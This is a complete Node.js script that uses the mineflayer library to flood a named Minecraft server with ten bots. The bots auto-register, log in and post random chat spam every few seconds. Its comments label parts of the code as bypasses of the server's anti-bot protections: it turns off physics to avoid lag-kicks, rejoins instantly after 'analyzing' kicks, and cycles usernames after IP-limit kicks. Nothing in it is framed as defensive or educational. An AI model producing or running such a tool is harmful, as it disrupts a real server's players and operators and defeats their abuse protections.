const mineflayer = require('mineflayer');

const CONFIG = {
    host: 'noBnoT.org',
    port: 25565,
    botCount: 10,
    password: 'FastPass123!',
    joinDelay: 1500, // 1.5 seconds (The "Sweet Spot" for BungeeCord)
    spamInterval: 3000
};

function createBot(id) {
    const name = `User_${Math.random().toString(36).substring(2, 7)}`.toUpperCase();
    
    const bot = mineflayer.createBot({
        host: CONFIG.host,
        port: CONFIG.port,
        username: name,
        version: '1.8.8',
        // LIGHTWEIGHT MODE: Disables heavy calculations to bypass lag-kicks
        checkTimeoutInterval: 60000,
        physicsEnabled: false 
    });

    // High-speed event binding
    bot.on('message', (json) => {
        const m = json.toString();
        if (m.includes('/register')) bot.chat(`/register ${CONFIG.password} ${CONFIG.password}`);
        else if (m.includes('/login')) bot.chat(`/login ${CONFIG.password}`);
    });

    bot.once('spawn', () => {
        console.log(`[+] ${name} STABILIZED.`);
        
        // Rapid Spam Loop
        setInterval(() => {
            if (bot.entity) bot.chat(Math.random().toString(36).substring(2, 10).toUpperCase());
        }, CONFIG.spamInterval);
    });

    // THE BYPASS: If kicked by Limbo/Analyzing, rejoin instantly with the SAME name
    bot.on('kicked', (reason) => {
        if (reason.includes("analyzing") || reason.includes("immediately")) {
            setTimeout(() => createBot(id), 500); 
        } else {
            // If it's an IP-limit kick, wait 30s and try a new name
            setTimeout(() => createBot(id), 30000);
        }
    });

    bot.on('error', () => {});
}

// THE STAMPEDE: Firing bots in a tight sequence
console.log("Launching Overdrive Sequence...");
for (let i = 0; i < CONFIG.botCount; i++) {
    setTimeout(() => createBot(i), i * CONFIG.joinDelay);
}
